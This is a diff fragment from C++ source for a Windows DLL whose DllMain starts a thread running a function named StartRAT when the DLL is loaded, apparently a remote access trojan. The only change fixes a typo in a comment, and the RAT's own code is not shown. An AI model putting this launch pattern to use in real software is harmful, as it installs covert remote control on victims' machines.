@@ -29,7 +29,7 @@ BOOL WINAPI DllMain(HINSTANCE dllHandle, DWORD reason_for_call, LPVOID lpvReserv
 	switch (reason_for_call) {
 	case DLL_PROCESS_ATTACH:
 		DisableThreadLibraryCalls(dllHandle);  // Avoid repeated DllMain calls for threads
-		CreateThread(nullptr, 0, StartRAT, nullptr, 0, nullptr); // Create a seperate thread to run after DllMain, to avoid deadlocks
+		CreateThread(nullptr, 0, StartRAT, nullptr, 0, nullptr); // Create a separate thread to run after DllMain, to avoid deadlocks
 		break;
 	case DLL_PROCESS_DETACH:
 		break;
